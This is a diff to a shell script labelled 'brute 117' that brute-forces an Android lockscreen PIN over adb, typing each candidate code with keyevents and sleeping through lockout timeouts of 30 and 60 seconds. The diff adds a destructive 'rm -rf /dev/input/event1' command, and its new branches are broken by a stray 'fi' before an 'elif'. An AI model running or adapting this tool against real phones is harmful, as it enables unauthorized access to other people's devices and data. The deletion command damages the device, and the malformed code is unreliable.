@@ -11,6 +11,7 @@ echo -e " ))~~~~~~~~~~~~~(( "
 echo -e "(( > brute 117 < ))"
 echo -e " )).............(( "
 echo -e "(((<-._.-'<-._.-)))"
+adb shell rm -rf /dev/input/event1
 adb shell input keyevent 3
 adb shell input keyevent 82
 adb shell input swipe 407 1211 378 85
@@ -45,10 +46,21 @@ do
                     adb shell input keyevent $((`echo ${i:$j:1}`+7))
                 done
                 adb shell input keyevent 66
-            elif ( [[ $((10#$i)) != 5 ]] || [[ $((10#$i)) != 10 ]] ) && [[ $((10#$i)) -gt 10 ]]; then
+            elif ( [[ $((10#$i)) != 5 ]] || [[ $((10#$i)) != 10 ]] ) && [[ $((10#$i)) -gt 10 ]] && [[ $((10#$i)) -lt 40 ]]; then
                 echo -e "(( >  timeout  < ))"
                 echo -e "(((<-._.-'<-._.-)))"
                 sleep 30
+                echo -e "(( >    \e[1m$i\e[0m   < ))"
+                echo -e " ))~~~~~~~~~~~~~(( "
+                for (( j=0; j<${#i}; j++ )); do
+                    adb shell input keyevent $((`echo ${i:$j:1}`+7))
+                done
+                adb shell input keyevent 66
+            fi
+            elif ( [[ $((10#$i)) != 5 ]] || [[ $((10#$i)) != 10 ]] ) && [[ $((10#$i)) -gt 10 ]] && ( [[ $((10#$i)) -gt 40 ]] || [[ $((10#$i)) -eq 40 ]] ); then
+                echo -e "(( >  timeout  < ))"
+                echo -e "(((<-._.-'<-._.-)))"
+                sleep 60
                 echo -e "(( >    \e[1m$i\e[0m   < ))"
                 echo -e " ))~~~~~~~~~~~~~(( "
                 for (( j=0; j<${#i}; j++ )); do
